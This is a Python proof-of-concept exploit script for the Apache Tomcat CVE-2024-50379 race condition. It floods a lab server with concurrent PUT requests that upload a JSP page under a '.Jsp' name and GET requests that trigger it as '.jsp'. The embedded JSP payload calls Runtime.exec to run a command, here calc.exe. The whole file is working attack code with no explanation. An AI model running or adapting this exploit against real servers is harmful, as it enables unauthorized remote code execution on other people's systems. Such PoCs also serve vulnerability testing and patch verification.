# Reference: https://github.com/iSee857/CVE-2024-50379-PoC.git

import requests
from urllib.parse import urljoin
import concurrent.futures

target_url = "http://192.168.122.149:8080"
filename = "cve202450379"
target_url_put1 = f"{target_url}/{filename}.Jsp"
target_url_get1 = f"{target_url}/{filename}.jsp"
payload = "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(\"cmd /c calc.exe\"); %>"

with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
    futures = []
    for _ in range(1000):
        futures.append(executor.submit(requests.put, target_url_put1, headers={ "Content-Type": "application/json" }, data=payload))
        futures.append(executor.submit(requests.get, target_url_get1))            
    for future in concurrent.futures.as_completed(futures):
        try:
            response = future.result()
            if isinstance(response, requests.Response):
                if (response.status_code == 200):
                    print(f"\033[31mFind: {target_url}: Apache Tomcat CVE-2024-50379 Conditional Competition To RCE!\033[0m")
        except Exception as e:
            pass
